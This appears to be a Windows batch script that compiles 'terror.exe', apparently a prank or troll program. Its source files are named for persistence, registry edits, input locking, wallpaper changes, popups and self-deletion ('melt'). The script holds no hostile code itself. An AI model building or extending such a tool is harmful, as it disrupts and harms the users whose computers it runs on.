@echo off
call "C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvars64.bat"
cd /d "C:\Users\ildin\cheat\Troll"
cl /EHsc /O2 /MT ^
    main.cpp globals.cpp helper.cpp registry.cpp persistence.cpp ^
    input_lock.cpp wallpaper.cpp beep.cpp popup.cpp melt.cpp qr_popup.cpp ^
    user32.lib gdi32.lib gdiplus.lib shcore.lib advapi32.lib winmm.lib ^
    shell32.lib winhttp.lib oleaut32.lib ole32.lib ^
    /Fe:terror.exe
if %errorlevel% == 0 (
    echo.
    echo [OK] terror.exe compilado com sucesso!
) else (
    echo.
    echo [ERRO] Falha na compilacao.
)
